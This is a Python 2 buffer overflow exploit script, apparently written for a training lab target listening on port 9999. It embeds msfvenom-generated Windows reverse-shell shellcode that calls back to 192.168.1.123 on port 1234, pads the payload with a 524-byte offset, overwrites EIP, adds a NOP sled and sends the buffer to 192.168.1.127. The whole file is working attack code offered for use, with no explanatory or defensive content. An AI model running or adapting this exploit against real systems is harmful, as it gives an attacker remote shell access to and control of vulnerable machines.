#!/usr/bin/python
#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.123 LPORT=1234 EXITFUNC=thread -f python -v shellcode -a x86 -b "\x00"#


import socket
shellcode =  b""
shellcode += b"\xb8\x35\xbb\x91\xb0\xdb\xcb\xd9\x74\x24\xf4"
shellcode += b"\x5a\x29\xc9\xb1\x52\x31\x42\x12\x03\x42\x12"
shellcode += b"\x83\xdf\x47\x73\x45\xe3\x50\xf6\xa6\x1b\xa1"
shellcode += b"\x97\x2f\xfe\x90\x97\x54\x8b\x83\x27\x1e\xd9"
shellcode += b"\x2f\xc3\x72\xc9\xa4\xa1\x5a\xfe\x0d\x0f\xbd"
shellcode += b"\x31\x8d\x3c\xfd\x50\x0d\x3f\xd2\xb2\x2c\xf0"
shellcode += b"\x27\xb3\x69\xed\xca\xe1\x22\x79\x78\x15\x46"
shellcode += b"\x37\x41\x9e\x14\xd9\xc1\x43\xec\xd8\xe0\xd2"
shellcode += b"\x66\x83\x22\xd5\xab\xbf\x6a\xcd\xa8\xfa\x25"
shellcode += b"\x66\x1a\x70\xb4\xae\x52\x79\x1b\x8f\x5a\x88"
shellcode += b"\x65\xc8\x5d\x73\x10\x20\x9e\x0e\x23\xf7\xdc"
shellcode += b"\xd4\xa6\xe3\x47\x9e\x11\xcf\x76\x73\xc7\x84"
shellcode += b"\x75\x38\x83\xc2\x99\xbf\x40\x79\xa5\x34\x67"
shellcode += b"\xad\x2f\x0e\x4c\x69\x6b\xd4\xed\x28\xd1\xbb"
shellcode += b"\x12\x2a\xba\x64\xb7\x21\x57\x70\xca\x68\x30"
shellcode += b"\xb5\xe7\x92\xc0\xd1\x70\xe1\xf2\x7e\x2b\x6d"
shellcode += b"\xbf\xf7\xf5\x6a\xc0\x2d\x41\xe4\x3f\xce\xb2"
shellcode += b"\x2d\x84\x9a\xe2\x45\x2d\xa3\x68\x95\xd2\x76"
shellcode += b"\x3e\xc5\x7c\x29\xff\xb5\x3c\x99\x97\xdf\xb2"
shellcode += b"\xc6\x88\xe0\x18\x6f\x22\x1b\xcb\x50\x1b\x22"
shellcode += b"\x70\x39\x5e\x24\x82\x6b\xd7\xc2\xe0\x9b\xbe"
shellcode += b"\x5d\x9d\x02\x9b\x15\x3c\xca\x31\x50\x7e\x40"
shellcode += b"\xb6\xa5\x31\xa1\xb3\xb5\xa6\x41\x8e\xe7\x61"
shellcode += b"\x5d\x24\x8f\xee\xcc\xa3\x4f\x78\xed\x7b\x18"
shellcode += b"\x2d\xc3\x75\xcc\xc3\x7a\x2c\xf2\x19\x1a\x17"
shellcode += b"\xb6\xc5\xdf\x96\x37\x8b\x64\xbd\x27\x55\x64"
shellcode += b"\xf9\x13\x09\x33\x57\xcd\xef\xed\x19\xa7\xb9"
shellcode += b"\x42\xf0\x2f\x3f\xa9\xc3\x29\x40\xe4\xb5\xd5"
shellcode += b"\xf1\x51\x80\xea\x3e\x36\x04\x93\x22\xa6\xeb"
shellcode += b"\x4e\xe7\xc6\x09\x5a\x12\x6f\x94\x0f\x9f\xf2"
shellcode += b"\x27\xfa\xdc\x0a\xa4\x0e\x9d\xe8\xb4\x7b\x98"
shellcode += b"\xb5\x72\x90\xd0\xa6\x16\x96\x47\xc6\x32"

try:
  print "\n[+] Sending evil buffer..."
  offset = "A" * 524
  eip = "\xf3\x12\x17\x31"
  nops = "\x90" * 10

  buffer = offset + eip + nops + shellcode

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.1.127", 9999))
  s.send(buffer)
  
  s.close()
 
  print "\n[+] Sending buffer of " + str(len(buffer)) + " bytes..."
  print "\n[+] Sending buffer: " + buffer
  print "\n[+] Done!"
  
except:
  print "\n[+] Could not connect!"
